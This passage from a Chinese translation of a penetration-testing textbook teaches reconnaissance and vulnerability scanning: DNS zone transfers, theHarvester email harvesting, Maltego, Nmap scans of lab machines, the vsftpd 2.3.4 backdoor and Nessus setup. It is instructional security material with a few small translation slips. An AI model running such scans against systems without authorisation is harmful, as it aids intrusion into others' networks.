  zoneedit.com name server ns3.zoneedit.com.\n--snip--\n```\n\n此输出向我们展示了 `zoneedit.com`\
  \ 的所有 DNS 服务器。自然地，由于我提到该域名是为了演示区域传输而设置的，这正是我们接下来要做的。\n\n#### 区域传输（Zone Transfers）\n\
  \nDNS 区域传输允许名称服务器复制关于某个域的所有条目。在设置 DNS 服务器时，你通常有一个主名称服务器和一个备份服务器。要填充辅助 DNS 服务器中的所有条目，还有比查询主服务器获取其所有条目更好的方法吗？\n\
  \n遗憾的是，许多系统管理员设置 DNS 区域传输并不安全，导致任何人都可以传输该域的 DNS 记录。`zoneedit.com` 就是此类域的一个示例，我们可以使用\
  \ `host` 命令下载它所有的 DNS 记录。使用 `-l` 选项指定要传输的域名，并从上一个命令中选择一个名称服务器，如示例 5-4 所示。\n\n####\
  \ 示例 5-4. zoneedit.com 的区域传输\n\n```\nroot@kali:~# host -l zoneedit.com ns2.zoneedit.com\n\
  Using domain server:\nName: ns2.zoneedit.com\nAddress: 69.72.158.226#53\nAliases:\n\
  \nzoneedit.com name server ns4.zoneedit.com.\nzoneedit.com name server ns3.zoneedit.com.\n\
  zoneedit.com name server ns15.zoneedit.com.\nzoneedit.com name server ns8.zoneedit.com.\n\
  zoneedit.com name server ns2.zoneedit.com.\nzoneedit.com has address 64.85.73.107\n\
  www1.zoneedit.com has address 64.85.73.41\ndynamic.zoneedit.com has address 64.85.73.112\n\
  bounce.zoneedit.com has address 64.85.73.100\n--snip--\nmail2.zoneedit.com has address\
  \ 67.15.232.182\n--snip--\n```\n\n`zoneedit.com` 有数页的 DNS 条目，这为我们寻找渗透测试的漏洞时从何处开始提供了一个很好的思路。例如，`mail2.zoneedit.com`\
  \ 可能是一个邮件服务器，所以我们应该寻找运行在典型邮件端口（如 25，简单邮件传输协议和 110，POP3）上可能存在漏洞的软件。如果我们能找到 Web 邮件服务器，发现的任何用户名都可能引导我们走向正确的方向，以便我们可以猜测密码并访问敏感的公司电子邮件。\n\
  \n#### 搜索电子邮件地址（Searching for Email Addresses）\n\n外部测试发现的服务通常比内部少。除非员工使用双重身份验证，否则访问公司电子邮件可能是简单的。这些服务如\
  \ Web 服务器、邮件服务器、VPN 服务器以及可能的 FTP 是常见的攻击面。\n\n寻找用户名的一种极佳方法是在互联网上查找电子邮件地址。你可能会惊讶于能发现家长会的联系信息、运动队名单，当然还有社交媒体。\n\
  \n你可以使用一个名为 `theHarvester` 的 Python 工具在搜索结果中快速扫描可能的电子邮件地址。`theHarvester` 可以自动搜索\
  \ Google、Bing、PGP、LinkedIn 等平台的电子邮件地址。例如，在示例 5-5 中，我们将查看所有引擎的前 500 条结果。\n\n####\
  \ 示例 5-5. 对 bulbsecurity.com 运行 theHarvester\n\n```\nroot@kali:~# theharvester -d\
  \ bulbsecurity.com -l 500 -b all\n\n***************************************************\n\
  *                                               \n* TheHarvester Ver.2.2a      \
  \                                    \n* Coded by Christian Martorella         \
  \                          \n* Edge-Security Research                          \
  \                \n* cmartorella@edge-security.com                             \
  \      \n***************************************************\n\nFull harvest..\n\
  [-] Searching in Google..\n    Searching 0 results...\n    Searching 100 results...\n\
  \    Searching 200 results...\n    Searching 300 results...\n--snip--\n\n [+] Emails\
  \ found:\n------------------\ngeorgia@bulbsecurity.com\n\n [+] Hosts found in search\
  \ engines:\n------------------------------------\n50.63.212.1:www.bulbsecurity.com\n\
  \n--snip--\n```\n\n`bulbsecurity.com` 的发现不多，但 `theHarvester` 确实发现了我的电子邮件地址 `georgia@bulbsecurity.com`\
  \ 以及网站 `[www.bulbsecurity.com](http://www.bulbsecurity.com)`，以及我共享虚拟托管的其他网站。如果你针对你的组织运行\
  \ `theHarvester`，可能会发现更多结果。\n\n#### Maltego\n\n你可以使用 Maltego 来研究其他的互联网足迹，包括你自己的、公司的、你高中时代的宿敌的等等。Maltego\
  \ 使用的是互联网上公开的信息，因此对任何实体进行侦察都是完全合法的。\n\n\n\n\n要运行 Maltego，请在命令行中输入 `maltego`。Maltego\
  \ 的 `GUI` 将启动。你会被提示在 Paterva 网站创建一个免费账户并登录。登录后，选择 `Open a blank graph and let me\
  \ play around`（打开空白图表让我玩玩），然后点击 `Finish`（完成），如图图 5-2 所示。\n\n![Opening a new Maltego\
  \ graph](img/httpatomoreillycomsourcenostarchimages2030308.png.jpg)图 5-2. 打开一个新的\
  \ Maltego 图\n\n现在从左边界选择 `Palette`（调面板）选项。如你所见，我们可以收集各种实体的信息。\n\n让我们从 `bulbsecurity.com`\
  \ 域名开始，如图图 5-3 所示。从 `Palette`（Maltego 窗口的左侧）展开 `Infrastructure`（基础设施）选项，并将 `Palette`\
  \ 中的 `Domain`（域名）实体拖到新图表中。默认情况下，域名是 `paterva.com`。要将其更改为 `bulbsecurity.com`，可以双击文本或更改屏幕右侧的文本字段。\n\
  \n![Adding an entity to the graph](img/httpatomoreillycomsourcenostarchimages2030310.png.jpg)图\
  \ 5-3. 向图表添加实体\n\n一旦设置了域名，就可以在其上运行转换（transforms，Maltego 的术语，指查询），指示 Maltego 搜索感兴趣的信息。让我们从几个简单的转换开始，你可以右键点击域名图标并选择\
  \ `Run Transform`（运行转换）来查看它们，如图图 5-4 所示。\n\n在图中，我们可以看到适用于域名实体的所有转换。当你处理不同的实体时，将会有不同的转换选项。让我们为\
  \ `bulbsecurity.com` 域名查找 `MX` 记录，从而找到邮件服务器的位置。在 `All Transforms`（所有转换）下，选择 `To\
  \ DNS Name – MX (mail server)` 转换。\n\n正如我们之前的研究预期，Maltego 返回了 Google 邮件服务器，表明 `bulbsecurity.com`\
  \ 使用 Google Apps 处理电子邮件。我们可以运行简单的 `To Website [Quick lookup]`（到网站 [快速查找]）转换来获取 `bulbsecurity.com`\
  \ 的网站地址。参见图 5-5 查看此转换及上一个转换的结果。\n\n![Maltego transforms](img/httpatomoreillycomsourcenostarchimages2030312.png.jpg)图\
  \ 5-4. Maltego 转换![Transform results](img/httpatomoreillycomsourcenostarchimages2030314.png.jpg)图\
  \ 5-5. 转换结果\n\nMaltego 正确地找到了 `[www.bulbsecurity.com](http://www.bulbsecurity.com)`。攻击\
  \ Google 邮件服务器可能超出任何渗透测试的范围，但获取关于 `[www.bulbsecurity.com](http://www.bulbsecurity.com)`\
  \ 网站的更多信息无疑有用。我们可以对图表上的任何实体运行转换，因此选择网站 `[www.bulbsecurity.com](http://www.bulbsecurity.com)`\
  \ 来收集其数据。例如，我们可以运行 `ToServerTechnologiesWebsite` 转换来查看 `[www.bulbsecurity.com](http://www.bulbsecurity.com)`\
  \ 运行什么软件，如图图 5-6 所示。\n\n![www.bulbsecurity.com software](img/httpatomoreillycomsourcenostarchimages2030316.png.jpg)图\
  \ 5-6. [www.bulbsecurity.com](http://www.bulbsecurity.com) 软件\n\nMaltego 发现 `[www.bulbsecurity.com](http://www.bulbsecurity.com)`\
  \ 是一个带有 PHP、Flash 等的 Apache Web 服务器，并安装了 WordPress。WordPress 作为一个常用的博客平台，像许多软件一样，有着长期的安全历史。我们将在第\
  \ 14 章中研究利用网站漏洞。（希望我一直在更新我的 WordPress 博客，否则可能某天醒来发现我的网站被篡改了。太尴尬了！）\n\n你可以在 `[`www.paterva.com/`](http://www.paterva.com/)`\
  \ 找到关于 Maltego 的更多信息和教程。花时间使用 Maltego 转换来寻找有关你组织的有趣信息。在高手手中，Maltego 可以将小时的侦察工作变成几分钟，并获得同样的结果。\n\
  \n## 端口扫描\n\n当你开始渗透测试时，潜在范围实际上是无限的。客户可能运行任何数量带有安全问题的程序：他们的基础设施可能存在配置错误问题，导致被破解；弱密码或默认密码可能会交出安全系统的密钥；以此类推。渗透测试通常会将你的范围缩小到特定的\
  \ IP 段且不再扩展，这对比你的客户没有帮助。\n\n### 手动端口扫描\n\n例如，在上一章中我们看到 Windows XP 在 25 端口上运行 SMTP\
  \ 服务器。要使用它，我们需要找出哪些系统是活跃的以及运行什么软件。我们可以通过 telnet 或 Netcat 等工具连接端口来手动完成。\n\n```bash\n\
  root@kali:~# nc -vv 192.168.20.10 25\nnc: (192.168.20.10)25 [smtp] open\nnc: using\
  \ stream socket\nnc: using buffer size 8192\nnc: read 66 bytes from remote\n220\
  \ bookxp SMTP Server Slmail 5.0.4433 Ready\nESMTP spoken here\nnc: wrote 66 bytes\
  \ to local\n```\n\n事实证明，Windows XP 机器在端口 25 上运行 SMTP 服务器。在我们连接后，SMTP 服务器宣布自己为 `Slmail\
  \ -5.0.4433`。\n\n### 使用 Nmap\n\nNmap 是端口扫描的行业标准。有整本书的书都是关于如何使用 Nmap 的，手册页面可能有些望而生畏。我们在这里涵盖端口扫描的基础知识，并在后面的章节中回到该工具。\n\
  \n\n\n\n\n带有入侵检测和防御系统的防火墙在检测和阻止扫描流量方面已经取得了巨大进展，因此你可能运行 `Nmap` 扫描却完全没有任何结果。虽然你可能被雇佣对一个没有活动主机的网络范围进行外部渗透测试，但更有可能的情况是你被防火墙拦截了。相反，你的\
  \ `Nmap` 结果可能会显示每个主机都是存活的，并且如果你的扫描被发现，它们将在每个端口上进行监听。\n\n### SYN 扫描\n\n让我们从对目标机器运行\
  \ SYN 扫描开始。`SYN scan` 是一种不完成 TCP 握手的 TCP 扫描。TCP 连接始于三次握手：`SYN ▸ SYN-ACK ⧐ ACK`，如图图\
  \ 5-7 所示。\n\n![TCP three-way handshake](img/httpatomoreillycomsourcenostarchimages2030318.png.jpg)图\
  \ 5-7. TCP 三次握手\n\n在 SYN 扫描中，`Nmap` 发送 `SYN`，如果端口开启，则等待 `SYN-ACK`，但永远不会发送 `ACK`\
  \ 来完成连接。如果 `SYN` 包没有收到 `SYN-ACK` 响应，则该端口不可用；它是关闭的，要么连接正被过滤。通过这种方式，`Nmap` 在无需完全连接到目标机器的情况下发现端口是否开启。SYN\
  \ 扫描的语法是标记 `-sS`。\n\n接下来，正如你在示例 5-6 中所示，我们指定要扫描的 IP 地址或范围。最后，我们使用 `-o` 选项将 `Nmap`\
  \ 结果输出到文件。`-oA` 选项告诉 `Nmap` 以所有格式记录我们的结果：`*.nmap`、`*.gnmap`（可 grep Nmap）和 XML。`Nmap`\
  \ 格式（如示例 5-6）中 `Nmap` 打印到屏幕上的输出）格式良好且易于阅读。可 grep Nmap（如名称所示）的格式设计用于与 `grep` 工具配合以搜索特定信息。XML\
  \ 格式是用于将 `Nmap` 结果导入其他工具的标准格式。示例 5-6 显示了 SYN 扫描的结果。\n\n### 注意事项\n\n对我们在渗透测试中做的每件事都做好笔记始终是一个好主意。像\
  \ `Dradis` 这样的工具专门为跟踪渗透测试数据而设计，但只要你在进入报告阶段时对你所做的一切都有笔记，就没问题。我个人更倾向于使用纸和笔，或者充其量是那种创建一个包含所有结果的长\
  \ Word 文档的类型。跟踪结果的方法因渗透测试人员而异。将 `Nmap` 结果输出到文件是确保你拥有扫描记录的好方法。此外，你可以使用 Linux 命令行脚本记录打印到终端的所有内容——这是跟踪你所做一切事情的另一种好方法。\n\
  \n示例 5-6. 运行 Nmap SYN 扫描\n\n```\nroot@kali:~# nmap -sS 192.168.20.10-12 -oA booknmap\n\
  Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 07:28 EST\nNmap scan report\
  \ for 192.168.20.10\nHost is up (0.00056s latency).\nNot shown: 991 closed ports\n\
  PORT     STATE SERVICE\n21/tcp   open  ftp ❷\n25/tcp   open  smtp ❺\n80/tcp   open\
  \  http ❸\n106/tcp  open  pop3pw ❺\n110/tcp  open  pop3 ❺\n135/tcp  open  msrpc\n\
  139/tcp  open  netbios-ssn ❹\n443/tcp  open  https ❸\n445/tcp  open  microsoft-ds\
  \ ❹\n1025/tcp open  NFS-or-IIS\n3306/tcp open  mysql ❻\n5000/tcp open  upnp\nMAC\
  \ Address: 00:0C:29:A5:C1:24 (VMware)\n\nNmap scan report for 192.168.20.11\nHost\
  \ is up (0.00031s latency).\nNot shown: 993 closed ports\nPORT     STATE SERVICE\n\
  21/tcp   open  ftp ❷\n22/tcp   open  ssh\n80/tcp   open  http ❸\n111/tcp  open \
  \ rpcbind\n139/tcp  open  netbios-ssn ❹\n445/tcp  open  microsoft-ds ❹\n2049/tcp\
  \ open  nfs\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\n\nNmap scan report for 192.168.20.12\n\
  Host is up (0.0014s latency).\nNot shown: 999 filtered ports\nPORT     STATE SERVICE\n\
  80/tcp   open  http ❶\n135/tcp  open  msrpc\nMAC Address: 00:0C:29:62:D5:C8 (VMware)\n\
  \nNmap done: 3 IP addresses (3 hosts up) scanned in 1070.40 seconds\n```\n\n如你所见，`Nmap`\
  \ 在 Windows XP 和 Linux 机器上返回了几个端口。在接下来的几个章节中，我们将看到几乎所有这些端口都包含漏洞。希望这在你的渗透测试中不会发生，但为了向你介绍在实战中会遇到的许多类型的漏洞，我们的渗透测试实验室浓缩成了这三台机器。\n\
  \n话虽如此，仅仅因为端口开启并不意味着存在漏洞。相反，它只是留下了可能性，即漏洞软件可能运行在这些端口上。我们的 Windows 7 机器仅在端口 80 ❶（HTTP\
  \ Web 服务器的传统端口）和用于远程过程调用的 139 端口上监听。在未通过 Windows 防火墙的端口上可能有可利用的软件，机器本地也可能运行有漏洞的软件，但目前我们无法通过网络直接尝试利用\
  \ Web 服务器之外的任何东西。\n\n这种基础 `Nmap` 扫描已经帮助我们集中渗透测试的精力。Windows XP 和 Linux 目标都在运行 FTP\
  \ 服务器 ❷、Web 服务器 ❸ 和 SMB 服务器 ❹。Windows XP 机器还运行了一个开启了几个端口 ❺ 的邮件服务器和一个 MySQL 服务器 ❻。\n\
  \n### 版本扫描\n\n我们的 SYN 扫描是隐蔽的，但它并没有告诉我们关于实际在监听端口上运行的软件。与通过 `Netcat` 连接端口 25 获取的详细版本信息相比，SYN\
  \ 扫描的结果就有些平乏了。我们可以使用全 TCP 扫描（`nmap -sT`）或进一步使用 `Nmap` 的版本扫描（`nmap -sV`）来获取更多数据。在示例\
  \ 5-7 所示的版本扫描中，`Nmap` 会完成连接，然后尝试使用横幅获取（banner grabbing）等技术确定运行的是什么软件以及如果可能的话，其版本。\n\
  \n\n\n\n\n```\nroot@kali:~# nmap -sV 192.168.20.10-12 -oA bookversionnmap\n\nStarting\
  \ Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:29 EST\nNmap scan report for 192.168.20.10\n\
  Host is up (0.00046s latency).\nNot shown: 991 closed ports\nPORT     STATE SERVICE\
  \      VERSION\n21/tcp   open  ftp          FileZilla ftpd 0.9.32 beta\n25/tcp \
  \  open  smtp         SLmail smtpd 5.5.0.4433\n79/tcp   open  finger       SLMail\
  \ fingerd\n80/tcp   open  http         Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12\
  \ OpenSSL/0.9.8k\n                              mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4\
  \ Perl/v5.10.0)\n106/tcp  open  pop3pw       SLMail pop3pw\n110/tcp  open  pop3\
  \         BVRP Software SLMAIL pop3d\n135/tcp  open  msrpc        Microsoft Windows\
  \ RPC\n139/tcp  open  netbios-ssn\n443/tcp  open  ssl/http     Apache httpd 2.2.12\
  \ ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k\n                              mod_autoindex_color\
  \ PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)\n445/tcp  open  microsoft-ds Microsoft\
  \ Windows XP\n1025/tcp open  msrpc        Microsoft Windows RPC\n3306/tcp open \
  \ mysql        MySQL (unauthorized)\n5000/tcp open  upnp         Microsoft Windows\
  \ UPnP\nMAC Address: 00:0C:29:A5:C1:24 (Vmware)\nService Info: Host: georgia.com;\
  \ OS: Windows; CPE: cpe:/o:microsoft:windows\n\nNmap scan report for 192.168.20.11\n\
  Host is up (0.00065s latency).\nNot shown: 993 closed ports\nPORT     STATE SERVICE\
  \              VERSION\n21/tcp   open  ftp                  vsftpd 2.3.4\n22/tcp\
  \   open  ssh                  OpenSSH 5.1p Debian 3 (protocol 0)\n80/tcp   open\
  \  http                 Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-ubuntu4.6)\n111/tcp\
  \  open  rpcbind (rpcbind V2) \n139/tcp  open  netbios-ssn          Samba smbd 3.X\
  \ (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn          Samba smbd 3.X (workgroup:\
  \ WORKGROUP)\n2049/tcp open  nfs (nfs V2-4)\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\n\
  Service Info: OS: Unix, Linux; CPE: cpe:/o:linux:kernel\n\nNmap scan report for\
  \ 192.168.20.12\nHost is up (0.0010s latency).\nNot shown: 999 filtered ports\n\
  PORT     STATE SERVICE        VERSION\n80/tcp   open  http           Microsoft IIS\
  \ httpd 7.5\n135/tcp  open  msrpc          Microsoft Windows RPC\nMAC Address: 00:0C:29:62:D5:C8\
  \ (VMware)\n\nService detection performed. Please report any incorrect at http://nmap.org/submit/\n\
  Nmap done: 3 IP addresses (3 hosts up) scanned in 20.56 seconds\n```\n\n这一次我们获取了关于我们的\
  \ Windows XP 和 Linux 目标的更多信息。例如，我们知道 Linux 机器上有一个 FTP 服务器，但现在我们有合理的理由确认 FTP 服务器是\
  \ **Very Secure version 2.3.4**。我们将在下一章利用这些输出来搜索潜在的漏洞。至于我们的 Windows 7 系统，我们只发现它运行着\
  \ Microsoft IIS 7.5，这是一个相当新的版本。在 Windows 7 上安装 IIS 8 是可能的，但并不是官方支持的。该版本本身不会引起我的警觉。我们将在本章中发现，安装在此\
  \ IIS 服务器上的应用程序才是问题所在。\n\n### 注意\n\n请记住，Nmap 在某些情况下可能会报告错误的版本（例如，如果软件已经更新，但作为补丁的一部分没有修改欢迎横幅），但起码，它的版本扫描为我们进一步的研究提供了一个良好的起点。\n\
  \n#### UDP 扫描\n\nNmap 的 SYN 扫描和版本扫描都是 TCP 扫描，不查询 UDP 端口。由于 UDP 是无连接的，扫描逻辑有所不同。在\
  \ UDP 扫描 `-U` 中，Nmap 向端口发送 UDP 数据包。根据端口的不同，发送的数据包是特定于的。如果收到响应，则该端口被认为是开放的。如果端口关闭的，Nmap\
  \ 将收到一个 ICMP 端口不可达（Port Unreachable）消息。如果 Nmap 没有收到任何响应，那么要么端口是开放的但监听的程序不响应 Nmap\
  \ 的查询，要么流量被过滤了。因此，Nmap 并不总是区分开放的 UDP 端口和被防火墙过滤的端口。参见示例 5-8 的 UDP 扫描示例。\n\n示例 5-8。运行\
  \ UDP 扫描\n\n```\nroot@kali:~# nmap -sU 192.168.20.10-12 -oA bookudp\n\nStarting\
  \ Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:39 EST\nStats: 0:11:43 elapsed;\
  \ 0 hosts completed (3 up), 3 undergoing UDP Scan\nUDP Scan Timing: About 89.42%\
  \ done; ETC: 08:52 (0:01:23 remaining)\nNmap scan report for 192.168.20.10\nHost\
  \ is up (0.00027s latency).\nNot shown: 990 closed ports\nPORT     STATE       \
  \  SERVICE\n69/udp   open|filtered TFTP\n123/udp  open|filtered NTP\n135/udp  open\
  \          msrpc\n137/udp  open          netbios-ssn\n138/udp  open          netbios-ssn\n\
  445/udp  open|filtered microsoft-ds\n500/udp  open|filtered ismp\n1025/udp open|filtered\
  \ rpc\n1900/udp open|filtered upnp\n\nNmap scan report for 192.168.20.11\nHost is\
  \ up (0.00031s latency).\nNot shown: 994 closed ports\nPORT     STATE         SERVICE\n\
  68/udp   open|filtered dhc\n111/udp  open          rpcbind\n137/udp  open      \
  \    netbios-ssn\n138/udp  open          netbios-ssn\n2049/udp open          nfs\n\
  533/udp  open|filtered dns\n623/udp  open|filtered isd\n1611/udp open|filtered snmp\n\
  \nNmap scan report for 192.168.20.12\nHost is up (0.00072s latency).\nNot shown:\
  \ 999 filtered ports\nPORT     STATE         SERVICE\n137/udp  open          netbios-ssn\n\
  138/udp  open          netbios-ssn\n```\n\n#### 扫描端口\n\n默认情况下，Nmap 仅扫描它认为“有趣的”的\
  \ 1000 个端口，而不是 65535 个可能的 TCP 或 UDP 端口。要扫描特定端口，请配合 Nmap 使用 `-p` 标志。例如，要扫描 Windows\
  \ 目标上的 3232 端口，请参见示例 5-9。\n\n\n\n\n\n```\nroot@kali:~# nmap -p 3232 -sV 192.168.20.10\n\
  Starting Nmap 6.40 ( http://nmap.org ) at 2015-04-28 10:19 EDT\nNmap scan report\
  \ for 192.168.20.10\nHost is up (0.00031s latency).\nPORT     STATE SERVICE VERSION\n\
  3232/tcp open  unknown\n1 service unrecognized despite returning data❶. If you know\
  \ the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi\
  \ : ❷\nSF-Port3232-TCP:V=6.25%I=7%D=4/28%Time=517D2FFC%P=i686-pc-linux-gnu%r(GetR\n\
  SF:equest,B8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Zervit\\x200\\.4\\r\\\
  n❸X-Pow\nSF:ered-By:\\x20Carbono\\r\\nConnection:\\x20close\\r\\nAccept-Ranges:\\\
  x20bytes\\\nSF:r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\x2036\\r\\\
  n\\r\\n<html>\\r\\\nSF:n<body>\\r\\nhi\\r\\n</body>\\r\\n</html>\");\nMAC Address:\
  \ 00:0C:29:13:FA:E3 (VMware)\n```\n\n![Zervit 服务器在被 Nmap 扫描时崩溃。](img/httpsatomoreillycomsourcenostarchimages2030320.png.jpg)图\
  \ 5-8。Zervit 服务器在被 Nmap 扫描时崩溃了。\n\n在导致监听服务崩溃的过程中，正如 ❶ 所示，`Nmap` 无法确定运行什么软件，但它成功获取了服务的指纹。根据\
  \ ❷ 中指纹的 HTML 标签，该服务似乎是一个 Web 服务器。根据 `Server:` 字段，它是一个名为 `Zervit 0.4` 的东西 ❸。\n\n\
  此时，我们已经导致了服务崩溃，在渗透测试中可能再也无法看到它，因此任何潜在的漏洞可能变得毫无意义。当然，在我们的实验室中，只需切换到 Windows XP 目标机器并重启\
  \ `Zervit` 服务器。\n\n### 注意事项\n\n尽管希望你在渗透测试中不会让任何服务崩溃，但你始终可能遇到一个特别敏感的服务，它在编写时没有接受预期输入以外的任何内容，导致即使是像\
  \ `Nmap` 扫描这样看似无流量也会导致其崩溃。SCADA 系统在这种行为上尤臭昭名。你总是需要向客户解释这一点。在操作计算机时，没有保证。\n\n我们将在下一章中回到\
  \ `Nmap` 工具，届时我们将使用 `Nmap` 脚本引擎 (`NSE`) 在开始利用之前学习有关目标系统的详细漏洞信息。\n\n## 总结\n\n在本章中，我们通过使用公开可用资源和端口扫描器，很快地涵盖了大量内容。我们使用了\
  \ `theHarvester` 和 `Maltego` 等工具在互联网上搜索电子邮件地址和网站等信息。我们使用 `Nmap` 端口扫描器发现目标虚拟机上有哪些端口正在监听。根据我们发现的输出，现在我们可以开始像攻击者一样思考，并积极寻找系统中可利用的漏洞，同时对已知漏洞进行一些研究。在下一章中，我们将涵盖渗透测试的漏洞分析阶段。\n\
  \n## 第 6 章 发现漏洞\n\n在开始投放利用载程序之前，我们需要进行更多的研究和分析。在识别漏洞时，我们会积极寻找会在利用阶段导致攻破的问题。虽然某些安全公司只会运行自动化利用工具并寄于运气，但熟练的渗透测试人员对漏洞进行仔细研究将比任何工具本身都获得更好的结果。\n\
  \n我们将在本章中检查几种漏洞分析方法，包括自动化扫描、针对性分析和手动研究。\n\n## 从 Nmap 版本扫描到潜在漏洞\n\n现在我们已经获得了一些关于目标和攻击面的信息，可以制定方案来达成渗透测试目标。例如，端口\
  \ 21 上的 FTP 服务器宣布自己为 `Vsftpd 2.3.4`。`Vsftpd` 是 Very Secure FTP（非常安全的 FTP）的缩写。\n\n\
  我们可能会假设，一个自称*非常安全*的产品是在自找麻烦，事实上，在 2011 年 7 月，发现 `Vsftpd` 仓库被破解了。`Vsftpd` 的二进制文件被替换为带有后门的版本，该版本可以通过包含笑脸\
  \ `:)` 的用户名来触发。这会在端口 6200 上打开一个 root shell。一旦问题被发现，带后门的二进制文件就会被移除，官方的 `Vsftpd 2.3.4`\
  \ 被恢复。因此，尽管 `Vsftpd 2.3.4` 的存在并不保证我们的目标存在漏洞，但它绝对是一个值得考虑的威胁。渗透测试没有比搭一个已经拥有系统的攻击者便更简单了。\n\
  \n## Nessus\n\nTenable Security 的 `Nessus` 是最常用的商业漏洞扫描器之一，尽管许多供应商也提供类似的产品。`Nessus`\
  \ 的名字与一个被希腊神话英雄赫拉克勒斯杀死的马人同名，它的血后来杀杀了赫拉克勒斯。`Nessus` 数据库包含了跨平台和协议的漏洞，它的扫描器执行一系列检查来检测已知问题。你会发现有整本书和培训课程专门用于\
  \ `Nessus`，随着你对该工具越来越熟悉，你会发现什么方法最适合你。我在这里只对 `Nessus` 进行高层次讨论。\n\n`Nessus` 提供付费专业版，渗透测试人员和公司内部安全团队可以使用它来扫描网络漏洞。你可以使用名为\
  \ `Nessus Home` 的免费非商业版本来尝试书中的练习。`Nessus Home` 限制扫描 16 个 IP 地址。（Kali 未预装 Nessus，但我们在第一章中涵盖了安装方法）。\n\
  \n在运行 `Nessus` 之前，你需要启动 `Nessus` 守护进程。如所示输入 `service` 命令以在 TCP 端口 8834 上启动 `Nessus`\
  \ 界面。\n\n```\nroot@kali:~# service nessusd start\n```\n\n现在打开浏览器，通过将 `Iceweasel`\
  \ 浏览器指向 `https://kali:8834` 来访问 `Nessus`。（如果你想从另一个系统（如宿主机）访问 Nessus，你必须将 kali 替换为\
  \ IP 地址。）初始化几分钟后，你应该能看到第 1 章所示的登录界面。\n\n### Nessus 策略\n\n`Nessus` Web 界面在屏幕顶部有几个标签，如图\
  \ 6-2 所示。让我们从 Policies（策略）标签开始。`Nessus` 策略类似于配置文件，告诉 `Nessus` 在漏洞扫描中运行哪些漏洞检查、端口扫描器等。\n\
  \n![Nessus Web 界面登录界面](img/httpsatomoreillycomsourcenostarchimages2030322.png.jpg)图\
  \ 6-1。Nessus Web 界面登录界面![Nessus 策略](img/httpsatomoreillycomsourcenostarchimages2030324.png.jpg)图\
  \ 6-2. Nessus 策略\n\n要创建策略，点击 Nessus 界面左侧的 New Policy（新建策略）。`Nessus` 的策略向导将帮助你创建一个对扫描目标有用的策略，如图\
  \ 6-3 所示。对于我们的简单示例，选择 Basic Network Scan（基础网络扫描）。\n\n现在系统会提示你输入策略的一些基本信息，如图 6-4\
  \ 所示，包括名称、描述以及其他 `Nessus` 用户是否可以访问该策略。完成后，点击 Next（下一步）。\n\n![基础策略设置](img/httpsatomoreillycomsourcenostarchimages2030328.png.jpg)图\
  \ 6-4. 基础策略设置\n\n现在系统会询问这是内部扫描还是外部扫描，如图 6-5 所示。选择 Internal（内部）并点击 Next（下一步）。\n\n\
  \n\n\n\n![内部或外部扫描](img/httpatomoreillycomsourcenostarchimages2030330.png.jpg)图 6-5.\
  \ 内部或外部扫描\n\n如果你有凭据，Nessus 可以对主机进行身份验证，并寻找可能从网络面向视角发现的漏洞。此功能通常被内部安全团队用于测试其网络的安全态势。你可以在下一步中设置这些凭据，如图\
  \ 6-6 所示。现在，你可以留空此步并点击 `Save`。\n\n![添加凭据（可选）](img/httpatomoreillycomsourcenostarchimages2030332.png.jpg)图\
  \ 6-6. 添加凭据（可选）\n\n如图 6-7 所示，我们的新策略现在显示在 Policy（策略）选项卡中。\n\n![我们的策略已添加。](img/httpatomoreillycomsourcenostarchimages2030334.png.jpg)图\
  \ 6-7. 我们的策略已添加。\n\n### 使用 Nessus 进行扫描\n\n现在，让我们切换到 Scans（扫描）选项卡并对我们的目标机器运行 Nessus。点击\
  \ `Scans` ▸ `New Scan` 并填写扫描信息，如图 6-8 所示。Nessus 需要知道扫描的名称（`Name`）、使用何种扫描策略（`Policy`）以及扫描哪些系统（`Targets`）。\n\
  \n![开始 Nessus 扫描](img/httpatomoreillycomsourcenostarchimages2030336.png.jpg)图 6-8.\
  \ 开始 Nessus 扫描\n\nNessus 会对目标运行一系列探测，试图尽可能检测或排除所有问题。正在运行的扫描会被添加到 Scans 选项卡中，如图 6-9\
  \ 所示。\n\n![运行 Nessus 扫描](img/httpatomoreillycomsourcenostarchimages2030338.png.jpg)图\
  \ 6-9. 运行 Nessus 扫描\n\n一旦扫描完成，点击它即可查看结果，如图 6-10 所示。\n\n![结果的高级概述](img/httpatomoreillycomsourcenostarchimages2030340.png.jpg)图\
  \ 6-10. 结果的高级概述\n\n如图所示，Nessus 在 Windows XP 和 Ubuntu 目标上发现了几个关键漏洞。但在 Windows 7 机器上仅发现了信息级数据。\n\
  \n要查看特定主机的详情，请点击它。Windows XP 漏洞的详情显示在图 6-11 中。\n\n![Nessus 对结果进行分类和描述。](img/httpatomoreillycomsourcenostarchimages2030342.png.jpg)图\
  \ 6-11. Nessus 对结果进行分类和描述。\n\n对于漏洞扫描器随你怎么说都可以，但很难找到一种产品能像 Nessus 那样快速且毫不费力地告诉你这么多关于目标环境的内。例如，Nessus\
  \ 的结果显示我们的 Windows XP 目标实际上缺少了第 4 章中讨论的 MS08-067 补丁。它似乎还缺少影响 SMB 器的其他 Microsoft\
  \ 补丁。\n\n哪个漏洞最容易利用？针对特定问题的 Nessus 输出通常会提供关于该问题潜在可利用性的信息。例如，点击输出结果中的 MS08-067 漏洞（图\
  \ 6-12），可以看到 Metasploit 中可用的该漏洞利用代码，以及 Core Impact 和 Canvas 等工具。\n\n![MS08-067 Nessus\
  \ 条目提供了详细信息。](img/httpatomoreillycomsourcenostarchimages2030344.png.jpg)图 6-12.\
  \ MS08-067 Nessus 条目提供了详细信息。\n\n### 关于 Nessus 排名的说明\n\nNessus 根据美国国家标准技术研究院（NIST）的通用漏洞评分系统（CVSS）第\
  \ 2 版对漏洞进行排名。排名基于漏洞被利用时对系统产生的影响。尽管漏洞排名越高，Nessus 认为漏洞问题越严重，但漏洞的实际风险取决于环境。例如，Nessus\
